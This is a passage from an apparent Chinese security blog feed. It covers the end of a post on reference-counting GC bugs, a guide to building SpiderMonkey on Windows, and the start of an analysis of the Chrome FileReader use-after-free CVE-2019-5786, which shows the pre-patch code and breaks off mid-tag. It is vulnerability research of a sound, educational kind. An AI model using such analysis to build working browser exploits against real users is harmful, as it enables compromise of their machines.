的许多引用（可以减少序列化时的循环次数），最后通过上面提到的漏洞场景来增加 <code>SharedArrayBuffer</code> 的引用计数，以实现在可控的时间内触发引用计数的整数溢出。</p><p>有了上述条件，就可以通过引用计数的溢出来触发 UAF 漏洞，之后再通过利用 UAF 漏洞来实现代码执行。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05. 小结"></a>0x05. 小结</h2><p>以上，就是在学习基于引用计数的 GC 时想到的几个漏洞案例，后续如有找到新的案例再进行补充。</p><p><img src="/uploads/201907/gc.gif" alt="Garbage Collector"></p><p>听说这是 Java 的垃圾回收？哈哈哈</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;垃圾分类&lt;/strong&gt; 是最近非常火爆的一个话题，其经常出现在各种新闻报道中，碰巧的是笔者最近也在研究 &lt;strong&gt;垃圾回收&lt;/strong&gt; ，但此垃圾非彼垃圾，笔者研究的是程序设计语言中的 &lt;strong&gt;Garbage Collection&lt;/strong&gt;（下文简称 &lt;strong&gt;GC&lt;/strong&gt;）。&lt;/p&gt;
&lt;p&gt;关于 GC 的入门读物，这里强烈推荐日本人在 2010 年出版的书籍《&lt;strong&gt;垃圾回收的算法与实现&lt;/strong&gt;》。笔者在阅读该书的部分内容时，刚好想到了几个相关的漏洞，因此写篇文章记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Garbage Collection" scheme="http://programlife.net/categories/Vulnerability/Garbage-Collection/"/>
    
    
      <category term="引用计数" scheme="http://programlife.net/tags/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0/"/>
    
      <category term="垃圾回收" scheme="http://programlife.net/tags/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
    
      <category term="GC" scheme="http://programlife.net/tags/GC/"/>
    
      <category term="Use-After-Free" scheme="http://programlife.net/tags/Use-After-Free/"/>
    
      <category term="VBScript" scheme="http://programlife.net/tags/VBScript/"/>
    
      <category term="Firefox" scheme="http://programlife.net/tags/Firefox/"/>
    
  </entry>
  
  <entry>
    <title>SpiderMonkey 编译</title>
    <link href="http://programlife.net/2019/05/18/spidermonkey-build/"/>
    <id>http://programlife.net/2019/05/18/spidermonkey-build/</id>
    <published>2019-05-18T00:13:37.000Z</published>
    <updated>2019-07-03T14:52:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Why"><a href="#0x01-Why" class="headerlink" title="0x01. Why"></a>0x01. Why</h2><p>道路千万条，编译第一条！</p><p>在 Windows 上编译开源软件，总是有各种各样的坑等着去填。</p><a id="more"></a><h2 id="0x02-Steps"><a href="#0x02-Steps" class="headerlink" title="0x02. Steps"></a>0x02. Steps</h2><h3 id="2-1-工具"><a href="#2-1-工具" class="headerlink" title="2.1 工具"></a>2.1 工具</h3><ul><li>Git</li><li>Mozilla-Build</li><li>CMake</li><li>Visual Studio 2017</li></ul><h3 id="2-2-步骤"><a href="#2-2-步骤" class="headerlink" title="2.2 步骤"></a>2.2 步骤</h3><p>使用 Git 拉取最新的源代码，如果对历史 commit 不感兴趣，可以选择 <code>--depth 1</code> 来加快拉取速度：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/mozilla/gecko-dev.git</span><br></pre></td></tr></table></figure><p>安装 <a href="https://ftp.mozilla.org/pub/mozilla/libraries/win32/MozillaBuildSetup-3.2.exe" target="_blank" rel="noopener">Mozilla-Build</a> ，这会配置一个基本的 MinGW32 环境；安装完毕之后，打开 Mozilla-Build ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‪C:\mozilla-build\start-shell.bat</span><br></pre></td></tr></table></figure><p>切换到 SpiderMonkey 所在的路径，并执行如下命令（参考 <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/" target="_blank" rel="noopener">Introduction to SpiderMonkey Exploitation</a> ）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">autoconf-2.13</span><br><span class="line">mkdir build.asserts</span><br><span class="line"><span class="built_in">cd</span> build.asserts</span><br><span class="line">../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --<span class="built_in">enable</span>-debug</span><br></pre></td></tr></table></figure><p>提示找不到 C 编译器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checking for the target C compiler... not found</span><br><span class="line">DEBUG: _cc: Trying clang-cl</span><br><span class="line">DEBUG: _cc: Trying gcc</span><br><span class="line">DEBUG: _cc: Trying clang</span><br><span class="line">ERROR: Cannot find the target C compiler</span><br></pre></td></tr></table></figure><p>此时，不要急着去下载安装 LLVM ，因为官方预编译版本都是没有 <code>llvm-config</code> 组件的，照样无法编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">checking for llvm-config... c:/Users/User\.mozbuild\clang\bin\llvm-config</span><br><span class="line">not found</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;../../../configure.py&quot;, line 132, in &lt;module&gt;</span><br><span class="line">    sys.exit(main(sys.argv))</span><br><span class="line">  File &quot;../../../configure.py&quot;, line 38, in main</span><br><span class="line">    sandbox.run(os.path.join(os.path.dirname(__file__), &apos;moz.configure&apos;))</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 481, in run</span><br><span class="line">    func(*args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 525, in _value_for</span><br><span class="line">    return self._value_for_depends(obj)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\util.py&quot;, line 947, in method_call</span><br><span class="line">    cache[args] = self.func(instance, *args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 534, in _value_for_depends</span><br><span class="line">    value = obj.result()</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\util.py&quot;, line 947, in method_call</span><br><span class="line">    cache[args] = self.func(instance, *args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 151, in result</span><br><span class="line">    return self._func(*resolved_args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/bindgen.configure&quot;, line 322, in basic_bindgen_cflags</span><br><span class="line">    info = check_compiler([clang_path], &apos;C++&apos;, target)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 508, in check_compiler</span><br><span class="line">    info = get_compiler_info(compiler, language)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 455, in get_compiler_info</span><br><span class="line">    result = try_preprocess(compiler, language, check)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 371, in try_preprocess</span><br><span class="line">    return try_invoke_compiler(compiler, language, source, [&apos;-E&apos;])</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 246, in try_invoke_compiler</span><br><span class="line">    return check_cmd_output(*cmd, **kwargs)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 69, in check_cmd_output</span><br><span class="line">    retcode, stdout, stderr = get_cmd_output(*args, **kwargs)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 46, in get_cmd_output</span><br><span class="line">    log.debug(&apos;Executing: `%s`&apos;, quote(*args))</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 206, in quote</span><br><span class="line">    return &apos; &apos;.join(_quote(s) for s in strings)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 206, in &lt;genexpr&gt;</span><br><span class="line">    return &apos; &apos;.join(_quote(s) for s in strings)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 194, in _quote</span><br><span class="line">    return t(&quot;&apos;%s&apos;&quot;) % s.replace(t(&quot;&apos;&quot;), t(&quot;&apos;\\&apos;&apos;&quot;))</span><br><span class="line">TypeError: cannot create &apos;NoneType&apos; instances</span><br></pre></td></tr></table></figure><p>没办法，只能自己编译一个 LLVM （参考 <a href="https://clang.llvm.org/get_started.html" target="_blank" rel="noopener">Building and Running Clang</a> ，记得先安装 CMake ）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth 1 https://github.com/llvm/llvm-project.git</span><br><span class="line">cd llvm-project</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DLLVM_ENABLE_PROJECTS=clang -G "Visual Studio 15 2017" -A x64 -Thost=x64 ../llvm</span><br></pre></td></tr></table></figure><p>然后用 Visual Studio 2017 打开 <code>LLVM.sln</code> 编译 Release 版本。</p><blockquote><p>Build the “clang” project for just the compiler driver and front end, or the “ALL_BUILD” project to build everything, including tools.</p></blockquote><p>现在，可以回到编译 SpiderMonkey 的步骤了，开始下一步之前，先把 LLVM 的路径添加到 <code>PATH</code> 环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LLVMDIR=/D/llvm-project/build/Release</span><br><span class="line">export PATH=$PATH:$LLVMDIR/bin</span><br></pre></td></tr></table></figure><p>继续配置编译 SpiderMonkey 相关的参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --<span class="built_in">enable</span>-debug</span><br></pre></td></tr></table></figure><p>提示找不到链接器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> mt... C:/PROGRA~2/WI3CF2~1/10/bin/100177~1.0/x64/mt.exe</span><br><span class="line">checking whether MT is really Microsoft Manifest Tool... yes</span><br><span class="line">checking <span class="keyword">for</span> linker... not found</span><br><span class="line">DEBUG: linker: Trying lld-link</span><br><span class="line">ERROR: Cannot find linker</span><br></pre></td></tr></table></figure><p>通过设置 <code>LINKER</code> 环境变量解决：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LINKER=<span class="string">"/C/Program Files (x86)/Microsoft Visual Studio/2017/Professional/VC/Tools/MSVC/14.15.26726/bin/Hostx64/x64/link.exe"</span></span><br></pre></td></tr></table></figure><p>继续运行 <code>configure</code> ，会提示找不到 <code>host_linker</code> ：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> linker... c:/PROGRA~2/MICROS~3/2017/PROFES~1/VC/Tools/MSVC/1415~1.267/bin/Hostx64/x64/link.exe</span><br><span class="line">checking <span class="keyword">for</span> host_linker... not found</span><br><span class="line">DEBUG: host_linker: Trying lld-link</span><br><span class="line">ERROR: Cannot find host_linker</span><br></pre></td></tr></table></figure><p>通过设置 <code>HOST_LINKER</code> 环境变量解决：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HOST_LINKER=<span class="variable">$LINKER</span></span><br></pre></td></tr></table></figure><p>一切正常，终于可以开始编译了（为了加快编译速度，可以指定 <code>-j</code> 参数）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozmake -j4</span><br></pre></td></tr></table></figure><h2 id="0x03-JavaScript-Shell"><a href="#0x03-JavaScript-Shell" class="headerlink" title="0x03. JavaScript Shell"></a>0x03. JavaScript Shell</h2><p>等 SpiderMonkey 编译完之后，在路径 <code>build.asserts\dist\bin</code> 下可以找到相关的二进制文件，其中 JavaScript Shell 为 <code>js.exe</code> 。</p><p>如果不想折腾编译，也可以直接从 <a href="https://archive.mozilla.org/pub/firefox/nightly/latest-mozilla-central/" target="_blank" rel="noopener">Firefox Nightly Builds</a> 直接下载已经编译好的 JavaScript Shell （这是 Release 版本，功能比 Debug 版本少一些）。</p><h3 id="3-1-SpiderMonkey"><a href="#3-1-SpiderMonkey" class="headerlink" title="3.1 SpiderMonkey"></a>3.1 SpiderMonkey</h3><p><code>js.exe</code> 支持参数启动，具体可以参考 <code>js.exe --help</code> 。</p><p><a href="https://programlife.net/tags/JavaScript/">JavaScript</a> Shell 提供了许多的内置函数可供调用，具体可以参考 <code>help()</code> 的执行结果（ Debug 版本比 Release 提供了更多的内置函数）；几个比较常用的函数：</p><ol><li>objectAddress ，打印 JavaScript 对象的内存地址</li><li>dumpObject ，打印 JavaScript 对象的结构</li><li>dis ，打印函数的字节码</li><li>quit ，退出 JavaScript Shell</li></ol><p><img src="/uploads/201905/spidermonkey-javascript-shell.png" alt="SpiderMonkey JavaScript Shell"></p><h3 id="3-2-IonMonkey"><a href="#3-2-IonMonkey" class="headerlink" title="3.2 IonMonkey"></a>3.2 IonMonkey</h3><p><a href="https://programlife.net/tags/SpiderMonkey/">SpiderMonkey</a> 的 JavaScript Shell 同时支持设置其 JIT 编译引擎 <a href="https://programlife.net/tags/IonMonkey/">IonMonkey</a> 的相关参数，可以将环境变量 <code>IONFLAGS</code> 设置为 <code>help</code> 来查看详细的帮助信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">set IONFLAGS=help</span><br><span class="line"></span><br><span class="line">js.exe</span><br><span class="line">found tag: help</span><br><span class="line"></span><br><span class="line">usage: IONFLAGS=option,option,option,... where options can be:</span><br><span class="line"></span><br><span class="line">  aborts        Compilation abort messages</span><br><span class="line">  scripts       Compiled scripts</span><br><span class="line">  mir           MIR information</span><br><span class="line">  prune         Prune unused branches</span><br><span class="line">  escape        Escape analysis</span><br><span class="line">  alias         Alias analysis</span><br><span class="line">  alias-sum     Alias analysis: shows summaries for every block</span><br><span class="line">  gvn           Global Value Numbering</span><br><span class="line">  licm          Loop invariant code motion</span><br><span class="line">  flac          Fold linear arithmetic constants</span><br><span class="line">  eaa           Effective address analysis</span><br><span class="line">  sincos        Replace sin/cos by sincos</span><br><span class="line">  sink          Sink transformation</span><br><span class="line">  regalloc      Register allocation</span><br><span class="line">  inline        Inlining</span><br><span class="line">  snapshots     Snapshot information</span><br><span class="line">  codegen       Native code generation</span><br><span class="line">  bailouts      Bailouts</span><br><span class="line">  caches        Inline caches</span><br><span class="line">  osi           Invalidation</span><br><span class="line">  safepoints    Safepoints</span><br><span class="line">  pools         Literal Pools (ARM only for now)</span><br><span class="line">  cacheflush    Instruction Cache flushes (ARM only for now)</span><br><span class="line">  range         Range Analysis</span><br><span class="line">  logs          JSON visualization logging</span><br><span class="line">  logs-sync     Same as logs, but flushes between each pass (sync. compiled functions only).</span><br><span class="line">  profiling     Profiling-related information</span><br><span class="line">  trackopts     Optimization tracking information gathered by the Gecko profiler. (Note: call enableGeckoProfiling() in your script to enable it).</span><br><span class="line">  trackopts-ext Encoding information about optimization tracking</span><br><span class="line">  dump-mir-expr Dump the MIR expressions</span><br><span class="line">  cfg           Control flow graph generation</span><br><span class="line">  all           Everything</span><br><span class="line"></span><br><span class="line">  bl-aborts     Baseline compiler abort messages</span><br><span class="line">  bl-scripts    Baseline script-compilation</span><br><span class="line">  bl-op         Baseline compiler detailed op-specific messages</span><br><span class="line">  bl-ic         Baseline inline-cache messages</span><br><span class="line">  bl-ic-fb      Baseline IC fallback stub messages</span><br><span class="line">  bl-osr        Baseline IC OSR messages</span><br><span class="line">  bl-bails      Baseline bailouts</span><br><span class="line">  bl-dbg-osr    Baseline debug mode on stack recompile messages</span><br><span class="line">  bl-all        All baseline spew</span><br><span class="line"></span><br><span class="line">See also SPEW=help for information on the Structured Spewer.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Why&quot;&gt;&lt;a href=&quot;#0x01-Why&quot; class=&quot;headerlink&quot; title=&quot;0x01. Why&quot;&gt;&lt;/a&gt;0x01. Why&lt;/h2&gt;&lt;p&gt;道路千万条，编译第一条！&lt;/p&gt;
&lt;p&gt;在 Windows 上编译开源软件，总是有各种各样的坑等着去填。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://programlife.net/categories/JavaScript/"/>
    
      <category term="SpiderMonkey" scheme="http://programlife.net/categories/JavaScript/SpiderMonkey/"/>
    
    
      <category term="Firefox" scheme="http://programlife.net/tags/Firefox/"/>
    
      <category term="JavaScript" scheme="http://programlife.net/tags/JavaScript/"/>
    
      <category term="SpiderMonkey" scheme="http://programlife.net/tags/SpiderMonkey/"/>
    
      <category term="IonMonkey" scheme="http://programlife.net/tags/IonMonkey/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786 Chrome FileReader UAF 漏洞分析</title>
    <link href="http://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/"/>
    <id>http://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/</id>
    <published>2019-03-25T10:00:00.000Z</published>
    <updated>2019-03-26T13:54:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>准备用业余时间学习一点浏览器漏洞利用相关的知识，刚好最近 Chrome 爆出来一个野外利用漏洞 CVE-2019-5786 ，而且网上也有两篇比较详细的分析报告（来自 <a href="https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/" target="_blank" rel="noopener">Exodus Intelligence</a> 和 <a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/" target="_blank" rel="noopener">McAfee Labs</a>），刚好可以借鉴学习一下漏洞的原理以及利用技巧。</p><p>Chrome 72.0.3626.121 的 <a href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">安全公告</a> 显示，漏洞 CVE-2019-5786 由 Google Threat Analysis Group 的 Clement Lecigne 发现其被利用于野外攻击（配合 Windows 内核空指针漏洞 CVE-2019-0808 可实现 Windows 7 下的提权操作）。</p><a id="more"></a><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02. 漏洞分析"></a>0x02. 漏洞分析</h2><h3 id="2-1-FileReader"><a href="#2-1-FileReader" class="headerlink" title="2.1 FileReader"></a>2.1 FileReader</h3><p>Chrome 的安全公告指明该 UAF 漏洞位于 <a href="https://developer.mozilla.org/en-US/docs/Web/API/FileReader" target="_blank" rel="noopener">FileReader</a> 中，因此在进行具体的漏洞分析工作之前，有必要简单了解一下 FileReader 对象的用法。FileReader 可以实现对文件内容（<strong>File</strong>）或者缓冲区数据（<strong>Blob</strong>）的异步读取，其中几个重要的属性或者回调函数如下所示。</p><ul><li><code>readyState</code> 表示读取状态<ul><li>EMPTY，0，尚未读取任何数据</li><li>LOADING，1，正在读取数据</li><li>DONE，2，数据读取完成</li></ul></li><li><code>result</code> 表示读取结果，具体的格式与数据的读取方式有关<ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><code>onprogress</code> 回调函数<ul><li>读取 <strong>Blob</strong> 时触发</li><li>当数据比较多时可能会周期性触发多次</li></ul></li><li><code>onloadend</code> 回调函数<ul><li>读取操作完成时触发，不管最终读取成功还是失败</li></ul></li></ul><p>下面是 FileReader 的一段简单示例代码（读取长度为 100MB 的字符串到 ArrayBuffer 中）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var size = 100 * 1024 * 1024;</span></span><br><span class="line"><span class="undefined">var string = 'A'.repeat(size);</span></span><br><span class="line"><span class="undefined">var blob = new Blob([string]);</span></span><br><span class="line"><span class="undefined">var reader = new FileReader();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.onprogress = function(event) &#123;</span></span><br><span class="line"><span class="undefined">    console.log('current read bytes: ' + event.target.result.byteLength);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.onloadend = function(event) &#123;</span></span><br><span class="line"><span class="undefined">    console.log('read as ArrayBuffer: ' + event.target.result);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为待读取的内容比较大，因此可以看到 <code>onprogress</code> 回调函数被多次触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">current read bytes: 69730304</span><br><span class="line">current read bytes: 104660992</span><br><span class="line">current read bytes: 104857600</span><br><span class="line">read as ArrayBuffer: [object ArrayBuffer]</span><br></pre></td></tr></table></figure><h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="2-2-1-代码查看"><a href="#2-2-1-代码查看" class="headerlink" title="2.2.1 代码查看"></a>2.2.1 代码查看</h4><p>由于众所周知的原因，在国内下载 Chromium 的源码是非常不方便的，另外如果电脑配置一般的话，在 Visual Studio 中查看和编译代码也是一件非常痛苦的事情，因此笔者推荐使用 Chromium 的在线浏览代码功能，因为支持查找和跳转，使用起来非常方便。查看代码的 URL 格式非常简单，指明文件路径、CL 版本（Change List 版本，即 GIT 提交时创建的 HASH 值）、代码行号即可。</p><blockquote><p><a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137</a></p></blockquote><h4 id="2-2-2-补丁对比"><a href="#2-2-2-补丁对比" class="headerlink" title="2.2.2 补丁对比"></a>2.2.2 补丁对比</h4><p>从 Chrome 的安全公告可知漏洞的内部 ID 为 <a href="https://crbug.com/936448" target="_blank" rel="noopener">936448</a> ，尽管漏洞报告暂时不可访问，但是基于漏洞 ID 可以找到补丁的提交记录 <a href="https://chromium.googlesource.com/chromium/src/+/150407e8d3610ff25a45c7c46877333c4425f062" target="_blank" rel="noopener">150407e</a> （上一版本为 <a href="https://chromium.googlesource.com/chromium/src/+/1675c51b1d83160a8b7061f38bb722b2c43937b4" target="_blank" rel="noopener">1675c51</a> ）。</p><p>补丁之前的代码如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc:137</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        <span class="number">-1</span> * <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补丁之后的代码如下所示（<a 